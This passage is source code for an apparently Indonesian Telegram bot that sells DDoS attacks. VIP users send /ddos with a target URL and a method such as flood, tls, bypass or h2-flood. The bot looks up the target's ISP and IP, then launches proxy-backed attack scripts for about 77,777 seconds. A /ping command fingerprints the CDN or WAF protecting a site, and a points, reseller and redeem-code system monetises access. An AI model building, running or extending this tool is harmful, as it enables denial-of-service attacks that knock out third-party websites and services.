  // pilih method dan jalankan perintah yang sesuai
  if (methods === 'flood') {
    try {
      pushOngoing(target, methods, duration);
    } catch (e) {
      console.log('pushOngoing error:', e.message);
      try { await bot.sendMessage(chatId, `❗ ${e.message}`); } catch (_) {}
      return;
    }
    runAttackCommand(`node ${metode} ${target} ${duration} 100 100 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'strike') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'kill') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'bypass') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'raw') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration}`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'thunder') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'rape') {
    pushOngoing(target, methods, duration);
    // note: urutan argumen sesuai yang kamu berikan
    runAttackCommand(`node ${metode} ${duration} 10 proxy.txt 70 ${target}`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'storm') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'destroy') {
    pushOngoing(target, methods, duration);
    runAttackCommand(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else if (methods === 'h2-flood') {
    pushOngoing(target, methods, duration);
    // kamu belum sertakan exec untuk 'slim' di potongan awal — contoh generic:
    runAttackCommand(`node ${metode} ${target} ${duration} 100 110 proxy.txt`);
    try { sigma(); } catch (e) { /* ignore */ }

  } else {
    const msgNotRecognized = `Method ${methods} not recognized.`;
    console.log(msgNotRecognized);
    try { await bot.sendMessage(chatId, msgNotRecognized); } catch (_) {}
  }
});
bot.onText(/^\/poin$/, async (msg) => {
  const chatId = msg.chat.id;
  const uid = String(msg.from.id);
  const pts = await getPoints(uid);
  const reply = `🎯 Poin Anda: ${pts}\n\nBagikan link ini untuk mendapat poin: https://t.me/${BOT_NAME}?start=ref_${uid}`;
  await bot.sendMessage(chatId, reply, { disable_web_page_preview: true });
});
const SECURITY_PROVIDERS = [
  {
    name: "Cloudflare",
    cnameIncludes: ["cloudflare"],
    headerContains: ["cf-ray", "cf-cache-status", "server: cloudflare"],
    cookieName: ["__cf_bm", "__cfduid", "cf_clearance"]
  },
  {
    name: "Akamai",
    cnameIncludes: ["akamaiedge", "akamai"],
    headerContains: ["server: akamai", "x-akamai-request-id"],
    cookieName: []
  },
  {
    name: "Fastly",
    cnameIncludes: ["fastly"],
    headerContains: ["x-served-by", "x-cache", "server: fastly"],
    cookieName: []
  },
  {
    name: "Imperva (Incapsula)",
    cnameIncludes: ["incapdns", "incapsula"],
    headerContains: ["x-cdn", "x-iinfo", "x-incap-clientip"],
    cookieName: ["incap_ses"]
  },
  {
    name: "Sucuri",
    cnameIncludes: ["sucuri"],
    headerContains: ["x-sucuri-id", "server: sucuri"],
    cookieName: []
  },
  {
    name: "DDoS-Guard",
    cnameIncludes: ["ddos-guard", "ddosguard"],
    headerContains: ["server: ddos-guard"],
    cookieName: []
  },
  {
    name: "Cloudbric",
    cnameIncludes: ["cloudbric"],
    headerContains: ["x-cloudbric"],
    cookieName: []
  },
  {
    name: "StackPath",
    cnameIncludes: ["stackpath"],
    headerContains: ["server: stackpath"],
    cookieName: []
  },
  {
    name: "AWS WAF / Amazon CloudFront",
    cnameIncludes: ["cloudfront", "amazonaws"],
    headerContains: ["x-amz-cf-id", "x-amz-request-id", "server: cloudfront"],
    cookieName: []
  },
  {
    name: "Radware",
    cnameIncludes: ["radware"],
    headerContains: ["x-radware-request-id"],
    cookieName: []
  },
  // Tambahkan provider lain di sini sesuai kebutuhan...
];

// ====== Deteksi penyedia keamanan berdasarkan header, cookies, dan DNS/CNAME ======
async function detectSecurityProviders(domain, headers, rawSetCookie) {
  const found = new Set();

  const hdrStr = Object.entries(headers || {})
    .map(([k, v]) => `${k}: ${v}`)
    .join("\n")
    .toLowerCase();

  const cookieStr = (rawSetCookie || []).join(" ").toLowerCase();

  // 1) Cek CNAME / DNS (try resolve CNAME, A)
  try {
    const cnames = [];
    try {
      const c = await dns.resolveCname(domain);
      if (c && c.length) cnames.push(...c.map(s => s.toLowerCase()));
    } catch (e) {
      // tidak selalu ada CNAME, abaikan error
    }
    // Resolusi A untuk indikasi IP rentang (opsional)
    try {
      const as = await dns.resolve4(domain);
      if (as && as.length) cnames.push(...as.map(s => s.toLowerCase()));
    } catch (e) {}

    // per provider cek cnameIncludes
    for (const p of SECURITY_PROVIDERS) {
      const cnameMatch = p.cnameIncludes && p.cnameIncludes.some(ci => cnames.some(c => c.includes(ci)));
      if (cnameMatch) found.add(p.name);
    }
  } catch (e) {
    // skip dns problems
  }

  // 2) Cek headerContains dan cookieName
  for (const p of SECURITY_PROVIDERS) {
    if (p.headerContains && p.headerContains.some(hc => hdrStr.includes(hc.toLowerCase()))) {
      found.add(p.name);
    }
    if (p.cookieName && p.cookieName.some(cn => cookieStr.includes(cn.toLowerCase()))) {
      found.add(p.name);
    }
    // Cek server header khusus
    if (headers && headers.server && headers.server.toLowerCase().includes((p.name || "").toLowerCase())) {
      found.add(p.name);
    }
  }

  return Array.from(found);
}

bot.onText(/\/ping\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const raw = (match && match[1]) ? match[1].trim() : "";
  if (!raw) {
    await bot.sendMessage(chatId, `<b>Penggunaan:</b>\n/ping <i>https://contoh.com</i>`, { parse_mode: "HTML" });
    return;
  }

  // Normalisasi URL — gunakan nama variable targetUrl agar tidak bentrok dengan `url` module
  let targetUrl = raw;
  if (!/^https?:\/\//i.test(targetUrl)) targetUrl = "https://" + targetUrl;

  let domain;
  try {
    // gunakan url.parse dari module 'url'
    domain = url.parse(targetUrl).hostname;
    if (!domain) throw new Error("Hostname tidak ditemukan");
  } catch (e) {
    await bot.sendMessage(chatId, `❌ <b>URL tidak valid.</b> Pastikan menulis: <code>/ping https://example.com</code>`, { parse_mode: "HTML" });
    return;
  }

  // Kirim notifikasi awal
  const loadingMsg = await bot.sendMessage(chatId, `🔍 <b>Menganalisis:</b> <i>${escapeHtml(domain)}</i>\n⏳ Mohon tunggu, melakukan beberapa pengecekan...`, { parse_mode: "HTML" });

  try {
    const TOTAL = 12; // jumlah percobaan, bisa diubah
    const TIMEOUT = 6000; // ms
    const requests = [];

    // Jalankan request paralel menggunakan Promise.all agar cepat dan lebih "real"
    for (let i = 0; i < TOTAL; i++) {
      requests.push((async () => {
        const start = Date.now();
        try {
          const resp = await axios.get(targetUrl, {
            timeout: TIMEOUT,
            validateStatus: () => true,
            headers: {
              "User-Agent": `Mozilla/5.0 (compatible; InfoBot/1.0; +https://t.me/yourbot)`,
            },
          });
          const time = Date.now() - start;
          return { ok: true, status: resp.status, time, headers: resp.headers, setCookie: resp.headers['set-cookie'] || [] };
        } catch (err) {
          const time = Date.now() - start;
          return { ok: false, err: err.message, time, status: null, headers: null, setCookie: [] };
        }
      })());
    }

    const results = await Promise.all(requests);

    // Statistik
    const total = results.length;
    const successful = results.filter(r => r.ok && r.status >= 200 && r.status < 300).length;
    const blocked = results.filter(r => !r.ok || (r.status && r.status >= 400 && r.status < 500)).length;
    const bypassed = results.filter(r => r.ok && (r.status >= 300 && r.status < 200 || r.status >= 500)).length;
    const avgTime = Math.round(results.filter(r => r && r.time).reduce((s, r) => s + (r.time||0), 0) / Math.max(1, results.length));

    // Ambil headers sample
    let sampleHeaders = null;
    let sampleCookies = [];
    for (const r of results) {
      if (r.headers) {
        sampleHeaders = r.headers;
        sampleCookies = r.setCookie || [];
        break;
      }
    }

    // Deteksi penyedia keamanan
    const detectedProviders = await detectSecurityProviders(domain, sampleHeaders || {}, sampleCookies || []);
    const penyedia = detectedProviders.length ? detectedProviders.join(", ") : "Tidak terdeteksi";

    // Persentase
    const blockedPerc = ((blocked / total) * 100).toFixed(1);
    const sucPerc = ((successful / total) * 100).toFixed(1);
    const bypassedPerc = ((bypassed / total) * 100).toFixed(1);

    let tingkatKeamanan = "Rendah";
    if (detectedProviders.length && parseFloat(blockedPerc) >= 30) tingkatKeamanan = "Tinggi";
    else if (detectedProviders.length) tingkatKeamanan = "Sedang";
    else if (parseFloat(blockedPerc) >= 30) tingkatKeamanan = "Sedang";

    // Progress bar visual
    const successBar = createProgressBar(successful, total, 12);
    const blockedBar = createProgressBar(blocked, total, 12);
    const bypassBar = createProgressBar(bypassed, total, 12);

    // Server / teknologi (dari header)
    const serverHeader = (sampleHeaders && sampleHeaders.server) ? sampleHeaders.server : "Tidak tersedia";
    const xPoweredBy = (sampleHeaders && sampleHeaders['x-powered-by']) ? sampleHeaders['x-powered-by'] : "-";

    // Susun pesan (HTML)
    const caption = `
<b>📡 Hasil Ping: ${escapeHtml(domain)}</b>

<b>Kecepatan :</b> ${avgTime} ms
<b>Keamanan :</b> ${escapeHtml(penyedia)}
<b>Tingkat keamanan :</b> ${escapeHtml(tingkatKeamanan)}
    `;

    await bot.editMessageText(caption, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    });

  } catch (err) {
    await bot.editMessageText(`❌ <b>Gagal menganalisis ${escapeHtml(domain)}</b>\nError: <code>${escapeHtml(err.message || String(err))}</code>`, {
      chat_id: chatId,
      message_id: loadingMsg.message_id,
      parse_mode: "HTML"
    });
  }
});

function escapeHtml(text) {
  if (!text) return "";
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}
const TELEGRAM_LIMIT_MB = 49;
const TELEGRAM_LIMIT_BYTES = TELEGRAM_LIMIT_MB * 1024 * 1024;


// ====== Fungsi bantu zip ======
function zipFolderStream(sources, outPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(outPath);
    const archive = archiver("zip", { zlib: { level: 9 } });

    output.on("close", resolve);
    archive.on("error", reject);
    archive.pipe(output);

    const baseDir = process.cwd();

    // Jika `sources` berupa array file & folder
    for (const src of sources) {
      const target = path.join(baseDir, src);
      if (!fs.existsSync(target)) continue;

      const stat = fs.statSync(target);
      if (stat.isDirectory()) {
        archive.directory(target, src, {
          ignore: [
            "**/node_modules/**",
            "**/.git/**",
            "**/tmp/**",
            "**/temp/**",
            "**/logs/**"
          ],
        });
      } else {
        archive.file(target, { name: src });
      }
    }

    archive.finalize();
  });
}

// ====== Fungsi kirim file ke owner ======
async function sendFileToOwner(filePath, caption) {
  await bot.sendDocument(OWNER_ID, filePath, {
    caption,
    parse_mode: "HTML",
  });
}

// ====== Perintah /file atau /file all ======
bot.onText(/^\/backup(?:@[\w_]+)?(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name || msg.from.last_name || senderId;

  // Hanya owner
  if (senderId.toString() !== OWNER_ID.toString()) {
    return bot.sendMessage(
      chatId,
      `<b>❌ Access Denied!</b>\nPerintah ini hanya untuk owner.`,
      { parse_mode: "HTML" }
    );
  }

  const arg = (match[1] || "all").trim().toLowerCase();
  const baseDir = process.cwd();
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bot-zip-"));
  const zipName = `backup-${arg}-${Date.now()}.zip`;
  const zipPath = path.join(tmpDir, zipName);

  try {
    let sources;

    if (arg === "all") {
      sources = [
        "menu.js",
        "index.js",
        "package.json",
        "lib",
        "database",
        "config.js"
      ];
      await bot.sendMessage(
        chatId,
        `<b>📦 Mengompres file penting panel...</b>\nTanpa folder <code>node_modules</code> & file sampah.`,
        { parse_mode: "HTML" }
      );
    } else {
      // Kalau user ketik nama spesifik
      sources = [arg];
      await bot.sendMessage(
        chatId,
        `<b>📦 Mengompres:</b> <code>${arg}</code>`,
        { parse_mode: "HTML" }
      );
    }

    await zipFolderStream(sources, zipPath);

    const sizeBytes = fs.statSync(zipPath).size;
    const sizeMB = (sizeBytes / 1024 / 1024).toFixed(2);

    await bot.sendMessage(
      chatId,
      `<b>✅ Kompres selesai!</b>\n<b>📁 Nama:</b> <code>${zipName}</code>\n<b>📦 Ukuran:</b> ${sizeMB} MB`,
      { parse_mode: "HTML" }
    );

    if (sizeBytes <= TELEGRAM_LIMIT_BYTES) {
      await bot.sendMessage(chatId, `<b>📤 Mengirim ZIP ke owner...</b>`, { parse_mode: "HTML" });
      await sendFileToOwner(
        zipPath,
        `Backup ${arg === "all" ? "file penting panel" : arg} oleh ${senderName}`
      );
      await bot.sendMessage(chatId, `<b>✅ File ZIP berhasil dikirim ke owner.</b>`, { parse_mode: "HTML" });
    } else {
      await bot.sendMessage(
        chatId,
        `<b>⚠️ File terlalu besar (>${TELEGRAM_LIMIT_MB} MB)</b>\nSilakan ambil manual di server.`,
        { parse_mode: "HTML" }
      );
    }
  } catch (err) {
    console.error("/file error:", err);
    await bot.sendMessage(
      chatId,
      `<b>❌ Terjadi kesalahan:</b>\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  } finally {
    try {
      if (fs.existsSync(tmpDir)) fse.removeSync(tmpDir);
    } catch (e) {
      console.warn("⚠️ Gagal hapus direktori sementara:", e.message);
    }
  }
});

const RESELLER_FILE = './database/reseller.json';


// ===== Fungsi Reseller =====
function loadResellers() {
  if (!fs.existsSync(RESELLER_FILE)) fs.writeFileSync(RESELLER_FILE, '{}', 'utf8');
  try {
    return JSON.parse(fs.readFileSync(RESELLER_FILE, 'utf8') || '{}');
  } catch {
    return {};
  }
}

function saveResellers(obj) {
  fs.writeFileSync(RESELLER_FILE, JSON.stringify(obj, null, 2), 'utf8');
}

function isReseller(id) {
  const data = loadResellers();
  return !!data[id];
}

function addReseller(id) {
  const data = loadResellers();
  data[id] = true;
  saveResellers(data);
}

function delReseller(id) {
  const data = loadResellers();
  delete data[id];
  saveResellers(data);
}

// ===== Command /addreseller =====
bot.onText(/^\/addres\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];

  if (senderId !== OWNER_ID) return bot.sendMessage(chatId, '❌ Hanya Owner yang bisa menambah reseller.');

  addReseller(targetId);
  await bot.sendMessage(chatId, `✅ User ${targetId} sekarang menjadi Reseller.`);
});

// ===== Command /delreseller =====
bot.onText(/^\/delres\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];

  if (senderId !== OWNER_ID) return bot.sendMessage(chatId, '❌ Hanya Owner yang bisa menghapus reseller.');

  delReseller(targetId);
  await bot.sendMessage(chatId, `🗑️ User ${targetId} sudah dihapus dari daftar reseller.`);
});

const REDEEM_FILE = path.join(__dirname, "/database/redeem_codes.json");

// === CEK & BUAT FILE ===
if (!fs.existsSync(REDEEM_FILE)) fs.writeFileSync(REDEEM_FILE, "{}", "utf8");

// === LOAD & SAVE ===
function loadCodes() {
  try {
    return JSON.parse(fs.readFileSync(REDEEM_FILE, "utf8") || "{}");
  } catch {
    return {};
  }
}
function saveCodes(obj) {
  fs.writeFileSync(REDEEM_FILE, JSON.stringify(obj, null, 2), "utf8");
}

// === KONVERSI DURASI ===
function parseDuration(str) {
  if (!str) return 0;
  const num = parseInt(str);
  if (isNaN(num)) return 0;
  const unit = str.slice(-1).toLowerCase();
  switch (unit) {
    case "m":
      return num * 60 * 1000;
    case "h":
      return num * 60 * 60 * 1000;
    case "d":
      return num * 24 * 60 * 60 * 1000;
    default:
      return num * 1000;
  }
}

// === FORMAT TANGGAL ===
function formatDate(ts) {
  return new Date(ts).toLocaleString("id-ID", { timeZone: "Asia/Makassar" });
}

// === PERINTAH /ADDKODE ===
bot.onText(/^\/addkode\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = String(msg.from.id);
  if (sender !== OWNER_ID)
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa membuat kode.");

  const input = match[1].trim();
  const parts = input.split(",").map((p) => p.trim());

  if (parts.length < 3 || parts.length > 4)
    return bot.sendMessage(
      chatId,
      "⚙️ Format salah!\nGunakan salah satu format berikut:\n\n" +
        "• `/addkode REXZY123,5,1h`\n  → Tanpa batas pengguna\n\n" +
        "• `/addkode REXZYVIP,10,1d,5`\n  → Batas 5 pengguna\n",
      { parse_mode: "Markdown" }
    );

  const [kodeRaw, poinRaw, durasiRaw, totalRaw] = parts;
  const kode = kodeRaw.toUpperCase();
  const poin = Number(poinRaw);
  const durasiMs = parseDuration(durasiRaw);
  const total = totalRaw ? Number(totalRaw) : null;

  if (!kode || isNaN(poin) || poin <= 0 || durasiMs <= 0)
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nContoh: `/addkode REXZY123,5,1h`",
      { parse_mode: "Markdown" }
    );

  const codes = loadCodes();
  if (codes[kode])
    return bot.sendMessage(
      chatId,
      `⚠️ Kode *${kode}* sudah ada.`,
      { parse_mode: "Markdown" }
    );

  const now = Date.now();
  codes[kode] = {
    poin,
    dibuatOleh: sender,
    dibuatPada: now,
    kadaluarsa: now + durasiMs,
    totalUser: total, // null artinya tanpa batas
    sudahDigunakanOleh: [],
  };
  saveCodes(codes);

  const info =
    total === null
      ? `👥 *Tanpa batas pengguna*`
      : `👥 Batas Pengguna: *${total}*`;

  return bot.sendMessage(
    chatId,
    `✅ Kode berhasil dibuat!\n\n📦 Kode: \`${kode}\`\n💰 Poin: *${poin}*\n${info}\n🕒 Berlaku hingga: *${formatDate(
      now + durasiMs
    )}*`,
    { parse_mode: "Markdown" }
  );
});

// === PERINTAH /REDEEM ===
bot.onText(/^\/redeem\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = String(msg.from.id);
  const username = msg.from.username
    ? `@${msg.from.username}`
    : msg.from.first_name;
  const kode = match[1].trim().toUpperCase();

  const codes = loadCodes();
  const data = codes[kode];
  if (!data)
    return bot.sendMessage(chatId, "❌ Kode tidak ditemukan.");

  const now = Date.now();

  // Kadaluarsa
  if (now > data.kadaluarsa) {
    delete codes[kode];
    saveCodes(codes);
    return bot.sendMessage(
      chatId,
      `⚠️ Kode \`${kode}\` sudah *kadaluarsa!*`,
      { parse_mode: "Markdown" }
    );
  }

  // Sudah pernah digunakan user
  if (data.sudahDigunakanOleh.includes(userId))
    return bot.sendMessage(
      chatId,
      `🚫 Kamu sudah pernah menggunakan kode \`${kode}\`.`,
      { parse_mode: "Markdown" }
    );

  // Jika ada limit dan sudah penuh
  if (data.totalUser && data.sudahDigunakanOleh.length >= data.totalUser) {
    delete codes[kode];
    saveCodes(codes);
    return bot.sendMessage(
      chatId,
      `⚠️ Kode \`${kode}\` sudah mencapai batas pengguna.`,
      { parse_mode: "Markdown" }
    );
  }

  // Tambahkan poin ke user
  const total = incrementPoints(userId, data.poin); // Pastikan kamu punya fungsi ini
  data.sudahDigunakanOleh.push(userId);

  // Hapus kode jika limit habis
  if (data.totalUser && data.sudahDigunakanOleh.length >= data.totalUser) {
    delete codes[kode];
  }

  saveCodes(codes);

  // Notifikasi ke user
  await bot.sendMessage(
    chatId,
    `🎉 Berhasil klaim kode \`${kode}\`!\n💰 Kamu mendapat *${data.poin} poin*\n💎 Total Poin: *${total}*`,
    { parse_mode: "Markdown" }
  );

  // Notifikasi ke OWNER
  await bot.sendMessage(
    OWNER_ID,
    `👤 User *${username}* (ID: \`${userId}\`)\n💬 Baru saja menggunakan kode \`${kode}\``,
    { parse_mode: "Markdown" }
  );
});
// ===== Command /addpoin =====
bot.onText(/^\/addpoin\s+(\d+)\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];
  const amount = Number(match[2]);

  if (senderId !== OWNER_ID && !isReseller(senderId))
    return bot.sendMessage(chatId, '❌ Anda tidak memiliki izin untuk menambah poin.');

  if (Number.isNaN(amount) || amount <= 0)
    return bot.sendMessage(chatId, '⚠️ Jumlah poin harus positif.');

  const total = incrementPoints(targetId, amount);
  await bot.sendMessage(chatId, `✅ Berhasil menambah ${amount} poin untuk user ${targetId}.\nTotal poin: ${total}`);
});

// ===== Command /delpoin =====
bot.onText(/^\/delpoin\s+(\d+)\s+(\d+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const targetId = match[1];
  const amount = Number(match[2]);

  if (senderId !== OWNER_ID && !isReseller(senderId))
    return bot.sendMessage(chatId, '❌ Anda tidak memiliki izin untuk mengurangi poin.');

  if (Number.isNaN(amount) || amount <= 0)
    return bot.sendMessage(chatId, '⚠️ Jumlah poin harus positif.');

  const success = consumePoint(targetId, amount);
  if (!success)
    return bot.sendMessage(chatId, `⚠️ User ${targetId} tidak memiliki cukup poin.`);

  const total = getPoints(targetId);
  await bot.sendMessage(chatId, `✅ Berhasil mengurangi ${amount} poin dari user ${targetId}.\nSisa poin: ${total}`);
});
bot.onText(/^\/listpoin$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const pts = loadJSON(POINTS_FILE);
    const entries = Object.entries(pts);

    if (entries.length === 0) {
      return bot.sendMessage(chatId, "📭 Belum ada data poin yang tersimpan.");
    }

    entries.sort((a, b) => b[1] - a[1]);
    const topList = entries.slice(0, 20);

    // Gunakan tanda kutip biasa agar bisa menulis ``` literal
    let text = "```" + "\n🏆 TOP 20 USERS - LIST POIN\n\n";

    for (let i = 0; i < topList.length; i++) {
      const [id, point] = topList[i];
      const rank = (i + 1).toString().padStart(2, "0");
      text += `${rank}. ID: ${id} | 💰 ${point} poin\n`;
    }

    text += `\n📊 Total Pengguna: ${entries.length}\n` + "```"; // ← triple backtick literal

    await bot.sendMessage(chatId, text, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal memuat list poin:", err.message);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat memuat daftar poin.");
  }
});
bot.onText(/^\/risetpoin\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);

  if (!OWNER_ID) return bot.sendMessage(chatId, "❌ OWNER_ID belum diset.");
  if (senderId !== String(OWNER_ID)) return bot.sendMessage(chatId, "❌ Hanya OWNER yang dapat menggunakan perintah ini.");

  const jumlah = Number(match[1]);
  if (!Number.isInteger(jumlah) || jumlah <= 0) return bot.sendMessage(chatId, "❌ Masukkan jumlah pengurangan yang valid (angka bulat > 0).");

  try {
    const data = loadJSON(POINTS_FILE);
    const userIds = Object.keys(data);
    if (userIds.length === 0) return bot.sendMessage(chatId, "ℹ️ Tidak ada pengguna dengan poin.");

    let totalReduced = 0;
    let affected = 0;

    for (const id of userIds) {
      const before = Number(data[id] || 0);
      if (before <= 0) continue;
      const after = Math.max(0, before - jumlah);
      const reduced = before - after;
      if (reduced > 0) {
        data[id] = after;
        totalReduced += reduced;
        affected++;
      }
    }

    saveJSON(POINTS_FILE, data);

    return bot.sendMessage(
      chatId,
      `✅ Sukses.\n\nJumlah dikurangi per pengguna: ${jumlah}\nPengguna terpengaruh: ${affected}\nTotal poin berkurang: ${totalReduced}`
    );
  } catch (err) {
    return bot.sendMessage(chatId, `❌ Gagal mereset poin: ${err.message || err}`);
  }
});
const persistentChecks = new Map();

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
const renderBar = (pct, width = 10) => {
  const filled = Math.round((pct / 100) * width);
  const empty = width - filled;
  return `[${"█".repeat(filled)}${"░".repeat(empty)}] ${pct}%`;
};
const DATABASE_DIR = path.join(__dirname, "database");
const VIP_FILE = path.join(DATABASE_DIR, "vips.json");

// === CEK FILE VIP ===
if (!fs.existsSync(DATABASE_DIR)) {
  console.error("❌ Folder 'database' tidak ditemukan! Buat dulu foldernya.");
  process.exit(1);
}

if (!fs.existsSync(VIP_FILE)) {
  console.log("📁 Membuat file 'vips.json' baru di folder database...");
  fs.writeFileSync(VIP_FILE, JSON.stringify({}, null, 2), "utf8");
  console.log("✅ File berhasil dibuat!");
}

// === FUNGSI VIP ===
function loadVIPs() {
  try {
    const raw = fs.readFileSync(VIP_FILE, "utf8");
    return JSON.parse(raw || "{}");
  } catch (e) {
    console.error("❌ Gagal membaca file vips.json:", e);
    return {};
  }
}
function saveVIPs(data) {
  fs.writeFileSync(VIP_FILE, JSON.stringify(data, null, 2), "utf8");
}
function isVIP(id) {
  const vips = loadVIPs();
  return !!vips[id];
}
function addVIP(id) {
  const vips = loadVIPs();
  vips[id.toString()] = { addedAt: new Date().toISOString() };
  saveVIPs(vips);
}
function delVIP(id) {
  const vips = loadVIPs();
  delete vips[id];
  saveVIPs(vips);
}
// === FITUR TAMBAH & HAPUS VIP ===
bot.onText(/^\/addvip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const targetId = match[1];
  
  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menambah VIP!");
  }

  if (!targetId) {
    return bot.sendMessage(chatId, "⚠️ Gunakan format:\n`/addvip <id_user>`", { parse_mode: "Markdown" });
  }

  const vips = loadVIPs();
  if (vips[targetId]) {
    return bot.sendMessage(chatId, `⚠️ User dengan ID *${targetId}* sudah VIP!`, { parse_mode: "Markdown" });
  }

  addVIP(targetId);
  bot.sendMessage(chatId, `✅ Berhasil menambahkan user *${targetId}* ke daftar VIP!`, { parse_mode: "Markdown" });
});


bot.onText(/^\/delvip(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const targetId = match[1];
  
  if (userId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menghapus VIP!");
  }

  if (!targetId) {
    return bot.sendMessage(chatId, "⚠️ Gunakan format:\n`/delvip <id_user>`", { parse_mode: "Markdown" });
  }

  const vips = loadVIPs();
  if (!vips[targetId]) {
    return bot.sendMessage(chatId, `⚠️ User dengan ID *${targetId}* tidak ditemukan di daftar VIP.`, { parse_mode: "Markdown" });
  }

  delVIP(targetId);
  bot.sendMessage(chatId, `🗑️ User *${targetId}* telah dihapus dari daftar VIP.`, { parse_mode: "Markdown" });
});

bot.onText(/^\/ddos(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const penggunaName = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "Pengguna";

  if (!isVIP(userId)) {
    return bot.sendMessage(chatId, `🚫 Maaf fitur ini hanya untuk *VIP*.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❓ *Cara penggunaan:*\n\n```\n/ddos https://example.com flood\n```", { parse_mode: "Markdown" });
  }

  const data = await loadCooldowns();
  if (!data.nocd[userId]) {
    const lastUsed = data.users[userId] || 0;
    const now = Date.now();
    if (now - lastUsed < COOLDOWN_MS) {
      const rem = COOLDOWN_MS - (now - lastUsed);
      const sisa = Math.ceil(rem / 1000);
      return bot.sendMessage(chatId, `⚠️ *${penggunaName}*, fitur masih cooldown.\nTunggu ${sisa} detik.`, { parse_mode: "Markdown" });
    }
    data.users[userId] = Date.now();
    await saveCooldowns(data);
  }

  const input = match[1].trim().split(/\s+/);
  const target = input[0];
  const methodsRaw = input[1] || "flood";
  const methods = methodsRaw;
  const duration = 77777;
  const progressMsg = await bot.sendMessage(chatId, `Memproses...\n\`\`\`\n${renderBar(0)}\n\`\`\``, { parse_mode: "Markdown" });

  for (let pct = 5; pct <= 100; pct += 5) {
    await sleep(700);
    await bot.editMessageText(`🔄 *Memproses...*\n\n\`\`\`\n${renderBar(pct)}\n\`\`\`\n🎯 Target: ${target}`, {
      chat_id: chatId,
      message_id: progressMsg.message_id,
      parse_mode: "Markdown"
    });
  }

  let targetInfo = {};
  try {
    const hostname = new URL(target).hostname;
    const { data: ipdata } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    targetInfo = { isp: ipdata.isp || "-", ip: ipdata.query || "-", as: ipdata.as || "-" };
  } catch {
    targetInfo = { isp: "Gagal memuat", ip: "-", as: "-" };
  }

  const endAt = Date.now() + duration * 1000;
  const endTimeStr = new Date(endAt).toLocaleString("id-ID", { timeZone: "Asia/Makassar" });
  const finalMsg = `✅ *Proses Selesai*\n\n\`\`\`\n🎯 Target : ${target}\n⏱️ Durasi : ${duration} detik\n⚙️ Metode : ${methods}\n🌐 ISP    : ${targetInfo.isp}\n💻 IP     : ${targetInfo.ip}\n🏢 AS     : ${targetInfo.as}\n📅 Selesai: ${endTimeStr}\n\`\`\``;

  await bot.editMessageText(finalMsg, {
    chat_id: chatId,
    message_id: progressMsg.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Check Target", url: `https://check-host.net/check-http?host=${encodeURIComponent(target)}` }]
      ]
    }
  });

  const metodePath = path.join(__dirname, "lib", "cache", `${methods}.js`);
